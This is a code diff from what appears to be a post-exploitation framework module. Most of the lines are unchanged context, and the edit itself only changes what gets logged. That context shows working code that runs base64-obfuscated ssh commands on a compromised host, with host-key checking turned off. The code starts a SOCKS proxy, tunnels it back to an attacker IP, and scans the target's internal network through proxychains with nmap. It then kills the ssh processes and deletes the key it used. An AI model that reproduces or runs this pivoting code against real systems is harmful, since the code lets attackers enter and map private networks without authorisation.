@@ -67,18 +67,18 @@ class Module(BaseModule):
             session.log('starting socksproxy on target...')
             payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
-            session.log(f'Result: {result.stdout}')
+            session.log(f'Result: {result.returncode}')
 
             # forward local socksproxy to attacker
             session.log('forwarding target socksproxy to attacker...')
             payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
-            session.log(f'Result: {result.stdout}')
+            session.log(f'Result: {result.returncode}')
 
             # run nmap scan via proxychains
             session.log('running proxychains nmap...')
             result = subprocess.run(['proxychains', 'nmap', '-Pn', '-sT', '-T1', '-oX', 'scan.xml', '-p22,80,443,5000,8000,8080,8091', target_lan], cwd='/tmp', capture_output=True, text=True)
-            session.log(f'Result: {result.stdout}')
+            session.log(f'Result: {result.returncode}')
             
             # convert to json 
             # cat /tmp/scan.xml | jc --xml -p > /tmp/scan.json
@@ -86,7 +86,7 @@ class Module(BaseModule):
             # kill ssh socksproxy and portforward
             session.log('killing ssh socksproxy and portforward...')
             result = session.platform.run('kill -9 $(pgrep "^ssh .* /tmp/sockskey" -f)')
-            session.log(f'Result: {result.stdout}')
+            session.log(f'Result: {result.returncode}')
             
             # remove temporary archive from target
             if session.platform.Path('/tmp/sockskey').exists():
